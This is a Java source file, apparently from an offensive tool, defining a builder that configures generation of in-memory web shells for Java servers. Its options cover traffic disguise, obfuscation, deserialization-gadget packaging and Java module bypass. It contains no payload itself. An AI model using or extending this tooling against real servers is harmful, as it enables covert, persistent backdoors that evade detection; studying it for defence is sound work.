package org.leo.jmg.generation;

import org.leo.core.entity.Disguise;
import org.leo.jmg.ServletNamespace;
import org.leo.jmg.ShellGeneratorConfig;
import org.leo.jmg.TargetJavaVersion;
import org.leo.jmg.TransportProtocol;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

/**
 * 内存 Shell 生成入口的类型化命令。
 */
public final class MemoryShellGenerationCommand {

    private final Disguise requestDisguise;
    private final Disguise responseDisguise;
    private final String headerName;
    private final String headerValue;
    private final String serverType;
    private final String serverVersion;
    private final String injectorName;
    private final String packerType;
    private final TransportProtocol protocol;
    private final TargetJavaVersion targetJavaVersion;
    private final ServletNamespace servletNamespace;
    private final String urlPattern;
    private final String coreClassName;
    private final String injectorClassName;
    private final String shellClassName;
    private final boolean abstractTranslet;
    private final boolean bypassJavaModule;
    private final boolean lambdaSuffix;
    private final boolean staticInitialize;
    private final boolean shrink;
    private final int responseCode;
    private final String payloadKey;
    private final List<String> obfuscationSteps;
    private final String customJspTemplate;
    private final Long obfuscationSeed;

    private MemoryShellGenerationCommand(Builder builder) {
        this.requestDisguise = snapshot(builder.requestDisguise, true);
        this.responseDisguise = snapshot(builder.responseDisguise, false);
        this.serverType = requireText(builder.serverType, "serverType");
        this.serverVersion = trimToNull(builder.serverVersion);
        this.injectorName = requireText(builder.injectorName, "shellType");
        this.packerType = requireText(builder.packerType, "packerType");
        this.protocol = isBlank(builder.protocol)
                ? TransportProtocol.HTTP
                : TransportProtocol.parse(builder.protocol);
        boolean webSocketBuild = protocol == TransportProtocol.WEBSOCKET
                || "WebSocketInjector".equals(injectorName);
        this.headerName = webSocketBuild && builder.headerName == null
                ? ""
                : builder.headerName;
        this.headerValue = webSocketBuild && builder.headerValue == null
                ? ""
                : builder.headerValue;
        this.targetJavaVersion = isBlank(builder.targetJavaVersion)
                ? TargetJavaVersion.AUTO
                : TargetJavaVersion.parse(builder.targetJavaVersion);
        this.servletNamespace = isBlank(builder.servletNamespace)
                ? ServletNamespace.AUTO
                : ServletNamespace.parse(builder.servletNamespace);
        this.urlPattern = isBlank(builder.urlPattern)
                ? (webSocketBuild ? "/leo" : "/*")
                : builder.urlPattern.trim();
        this.coreClassName = trimToNull(builder.coreClassName);
        this.injectorClassName = trimToNull(builder.injectorClassName);
        this.shellClassName = trimToNull(builder.shellClassName);
        this.abstractTranslet = Boolean.TRUE.equals(builder.abstractTranslet);
        this.bypassJavaModule = Boolean.TRUE.equals(builder.bypassJavaModule);
        this.lambdaSuffix = Boolean.TRUE.equals(builder.lambdaSuffix);
        this.staticInitialize = Boolean.TRUE.equals(builder.staticInitialize);
        this.shrink = builder.shrink == null || builder.shrink;
        this.responseCode = builder.responseCode == null ? 200 : builder.responseCode;
        this.payloadKey = trimToNull(builder.payloadKey);
        this.obfuscationSteps = snapshot(builder.obfuscationSteps);
        this.customJspTemplate = trimToNull(builder.customJspTemplate);
        this.obfuscationSeed = builder.obfuscationSeed;
    }

    public static Builder builder(Disguise requestDisguise,
                                  Disguise responseDisguise) {
        return new Builder(requestDisguise, responseDisguise);
    }

    ShellGeneratorConfig toConfig() {
        ShellGeneratorConfig.Builder builder =
                ShellGeneratorConfig.builder(requestDisguise, responseDisguise)
                        .header(headerName, headerValue)
                        .serverType(serverType)
                        .serverVersion(serverVersion)
                        .shellType(injectorName)
                        .packerType(packerType)
                        .protocol(protocol.getValue())
                        .targetJavaVersion(targetJavaVersion)
                        .servletNamespace(servletNamespace)
                        .urlPattern(urlPattern)
                        .abstractTranslet(abstractTranslet)
                        .byPassJavaModule(bypassJavaModule)
                        .lambdaSuffix(lambdaSuffix)
                        .staticInitialize(staticInitialize)
                        .shrink(shrink)
                        .respCode(responseCode);
        if (payloadKey != null) builder.payloadKey(payloadKey);
        if (coreClassName != null) {
            builder.coreClassName(coreClassName);
        }
        if (injectorClassName != null) {
            builder.injectorClassName(injectorClassName);
        }
        if (shellClassName != null) {
            builder.shellClassName(shellClassName);
        }
        if (obfuscationSteps != null) {
            builder.jspObfuscationSteps(obfuscationSteps);
        }
        if (customJspTemplate != null) {
            builder.customJspTemplate(customJspTemplate);
        }
        if (obfuscationSeed != null) {
            builder.obfuscationSeed(obfuscationSeed);
        }
        return builder.build();
    }

    public String getServerType() {
        return serverType;
    }

    public String getServerVersion() {
        return serverVersion;
    }

    public String getInjectorName() {
        return injectorName;
    }

    public String getPackerType() {
        return packerType;
    }

    public String getUrlPattern() {
        return urlPattern;
    }

    public boolean isBypassJavaModule() {
        return bypassJavaModule;
    }

    public boolean isBypassJavaModuleEffective() {
        return bypassJavaModule || targetJavaVersion.isAtLeast(9);
    }

    public boolean isLambdaSuffix() {
        return lambdaSuffix;
    }

    public boolean isStaticInitialize() {
        return staticInitialize;
    }

    public boolean isShrink() {
        return shrink;
    }

    public boolean hasCustomJspTemplate() {
        return customJspTemplate != null;
    }

    public String getHeaderConfig() {
        return protocol == TransportProtocol.WEBSOCKET
                ? "WebSocket endpoint: " + urlPattern
                : String.valueOf(headerName) + " : " + String.valueOf(headerValue);
    }

    public static final class Builder {
        private final Disguise requestDisguise;
        private final Disguise responseDisguise;
        private String headerName;
        private String headerValue;
        private String serverType;
        private String serverVersion;
        private String injectorName;
        private String packerType;
        private String protocol;
        private String targetJavaVersion;
        private String servletNamespace;
        private String urlPattern;
        private String coreClassName;
        private String injectorClassName;
        private String shellClassName;
        private Boolean abstractTranslet;
        private Boolean bypassJavaModule;
        private Boolean lambdaSuffix;
        private Boolean staticInitialize;
        private Boolean shrink;
        private Integer responseCode;
        private String payloadKey;
        private List<String> obfuscationSteps;
        private String customJspTemplate;
        private Long obfuscationSeed;

        private Builder(Disguise requestDisguise,
                        Disguise responseDisguise) {
            this.requestDisguise = requestDisguise;
            this.responseDisguise = responseDisguise;
        }

        public Builder header(String name, String value) {
            this.headerName = name;
            this.headerValue = value;
            return this;
        }

        public Builder serverType(String serverType) {
            this.serverType = serverType;
            return this;
        }

        public Builder serverVersion(String serverVersion) {
            this.serverVersion = serverVersion;
            return this;
        }

        public Builder injectorName(String injectorName) {
            this.injectorName = injectorName;
            return this;
        }

        public Builder packerType(String packerType) {
            this.packerType = packerType;
            return this;
        }

        public Builder protocol(String protocol) {
            this.protocol = protocol;
            return this;
        }

        public Builder targetJavaVersion(String targetJavaVersion) {
            this.targetJavaVersion = targetJavaVersion;
            return this;
        }

        public Builder servletNamespace(String servletNamespace) {
            this.servletNamespace = servletNamespace;
            return this;
        }

        public Builder urlPattern(String urlPattern) {
            this.urlPattern = urlPattern;
            return this;
        }

        public Builder coreClassName(String coreClassName) {
            this.coreClassName = coreClassName;
            return this;
        }

        public Builder injectorClassName(String injectorClassName) {
            this.injectorClassName = injectorClassName;
            return this;
        }

        public Builder shellClassName(String shellClassName) {
            this.shellClassName = shellClassName;
            return this;
        }

        public Builder abstractTranslet(Boolean abstractTranslet) {
            this.abstractTranslet = abstractTranslet;
            return this;
        }

        public Builder bypassJavaModule(Boolean bypassJavaModule) {
            this.bypassJavaModule = bypassJavaModule;
            return this;
        }

        public Builder lambdaSuffix(Boolean lambdaSuffix) {
            this.lambdaSuffix = lambdaSuffix;
            return this;
        }

        public Builder staticInitialize(Boolean staticInitialize) {
            this.staticInitialize = staticInitialize;
            return this;
        }

        public Builder shrink(Boolean shrink) {
            this.shrink = shrink;
            return this;
        }

        public Builder responseCode(Integer responseCode) {
            this.responseCode = responseCode;
            return this;
        }

        public Builder payloadKey(String payloadKey) {
            this.payloadKey = payloadKey;
            return this;
        }

        public Builder obfuscationSteps(List<String> obfuscationSteps) {
            this.obfuscationSteps = obfuscationSteps;
            return this;
        }

        public Builder customJspTemplate(String customJspTemplate) {
            this.customJspTemplate = customJspTemplate;
            return this;
        }

        public Builder obfuscationSeed(Long obfuscationSeed) {
            this.obfuscationSeed = obfuscationSeed;
            return this;
        }

        public MemoryShellGenerationCommand build() {
            return new MemoryShellGenerationCommand(this);
        }
    }

    private static String requireText(String value, String name) {
        if (isBlank(value)) {
            throw new IllegalArgumentException(name + " 不能为空");
        }
        return value.trim();
    }

    private static List<String> snapshot(List<String> value) {
        return value == null
                ? null
                : Collections.unmodifiableList(new ArrayList<String>(value));
    }

    private static Disguise snapshot(Disguise value, boolean request) {
        if (value == null) {
            return null;
        }
        Disguise snapshot = new Disguise();
        if (request) {
            snapshot.setTrafficDecodeBody(value.getTrafficDecodeBody());
        } else {
            snapshot.setTrafficEncodeBody(value.getTrafficEncodeBody());
        }
        return snapshot;
    }

    private static String trimToNull(String value) {
        return isBlank(value) ? null : value.trim();
    }

    private static boolean isBlank(String value) {
        return value == null || value.trim().isEmpty();
    }
}
